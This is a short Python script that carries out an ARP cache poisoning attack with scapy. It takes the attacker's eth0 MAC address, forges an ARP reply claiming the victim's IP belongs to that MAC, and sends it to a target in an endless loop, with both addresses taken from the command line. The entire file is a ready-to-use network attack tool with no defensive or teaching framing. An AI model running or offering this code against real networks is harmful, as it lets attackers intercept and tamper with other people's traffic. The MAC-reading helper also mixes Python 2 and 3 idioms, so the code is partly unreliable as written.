import sys
import fcntl, socket, struct
from scapy.all import ARP,send

# get the MAC address of an interface
def getHwAddr(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack('256s', ifname[:15]))
    return ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]

def create_arp_packet(target, victim):
    a = ARP()
    # target whose arp cache is to be poisoned
    a.pdst = target
    # attacker's MAC Address of assuming eth0
    # get it from the system information
    a.hwsrc = getHwAddr('eth0')
    # victim's ip
    a.psrc = victim
    a.hwdst = "ff:ff:ff:ff:ff:ff"
    return a

def arp_poison(packet):
    while(1>0):
        send(packet)

def main():
    if len(sys.argv) != 3:
        print("Usage: Give target and vicitm ip address\n")
    else:
        packet = create_arp_packet(sys.argv[1], sys.argv[2])
        arp_poison(packet)
    
if __name__ == "__main__":
    main()
